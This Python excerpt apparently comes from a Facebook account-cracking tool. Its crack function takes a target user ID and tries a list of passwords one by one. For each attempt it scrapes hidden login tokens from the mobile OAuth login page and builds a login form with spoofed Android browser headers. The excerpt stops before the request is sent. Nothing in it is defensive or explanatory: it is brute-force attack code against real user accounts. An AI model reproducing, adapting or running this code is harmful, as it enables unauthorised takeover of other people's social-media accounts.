...
def crack(idf,pwv):
	...
	for pw in pwv:
		try:
			...
			p = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=1388024981350612&kid_directed_site=0&app_id=1388024981350612&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv13.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D1388024981350612%26cbt%3D1660752942638%26e2e%3D%257B%2522init%2522%253A1660752942638%257D%26ies%3D1%26sdk%3Dandroid-13.0.0%26sso%3Dchrome_custom_tab%26nonce%3Dad8a23d7-dd55-4744-9e4e-75246bab4dd9%26scope%3Dopenid%252Cpublic_profile%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%252257781c05-aceb-4468-9dbd-16802a240207%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522592ta11862lsndon8gfb%2522%257D%26code_challenge_method%3DS256%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb1388024981350612%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26code_challenge%3D6ItCpwBS21dKP-0x3elUetKQq_hK5fUPtev65w-MAQw%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D57781c05-aceb-4468-9dbd-16802a240207%26tp%3Dunspecified&cancel_url=fb1388024981350612%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252257781c05-aceb-4468-9dbd-16802a240207%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522592ta11862lsndon8gfb%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/v13.0/dialog/oauth?cct_prefetching=0&client_id=1388024981350612&cbt=1661320159602&e2e=%7B%22init%22%3A1661320159602%7D&ies=1&sdk=android-13.0.0&sso=chrome_custom_tab&nonce=9ae8ce4c-40b8-4ca3-a832-4882122551fd&scope=openid%2Cpublic_profile%2Cemail&state=%7B%220_auth_logger_id%22%3A%22d79644d5-6cc4-435a-8cd8-ac20d3159f60%22%2C%223_method%22%3A%22custom_tab%22%2C%227_challenge%22%3A%22flspeai3mktogvo9vtt1%22%7D&code_challenge_method=S256&default_audience=friends&login_behavior=NATIVE_WITH_FALLBACK&redirect_uri=fb1388024981350612%3A%2F%2Fauthorize%2F&auth_type=rerequest&response_type=id_token%2Ctoken%2Csigned_request%2Cgraph_domain&return_scopes=true&code_challenge=wR3t9Acqr17RzJiG2iBDJnybZfQn2zNPBTkTC1jgu7E&ret=login&fbapp_pres=0&logger_id=d79644d5-6cc4-435a-8cd8-ac20d3159f60&tp=unspecified#_=_","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=1388024981350612&kid_directed_site=0&app_id=1388024981350612&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv13.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D1388024981350612%26cbt%3D1660752942638%26e2e%3D%257B%2522init%2522%253A1660752942638%257D%26ies%3D1%26sdk%3Dandroid-13.0.0%26sso%3Dchrome_custom_tab%26nonce%3Dad8a23d7-dd55-4744-9e4e-75246bab4dd9%26scope%3Dopenid%252Cpublic_profile%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%252257781c05-aceb-4468-9dbd-16802a240207%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522592ta11862lsndon8gfb%2522%257D%26code_challenge_method%3DS256%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb1388024981350612%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26code_challenge%3D6ItCpwBS21dKP-0x3elUetKQq_hK5fUPtev65w-MAQw%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D57781c05-aceb-4468-9dbd-16802a240207%26tp%3Dunspecified&cancel_url=fb1388024981350612%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252257781c05-aceb-4468-9dbd-16802a240207%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522592ta11862lsndon8gfb%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
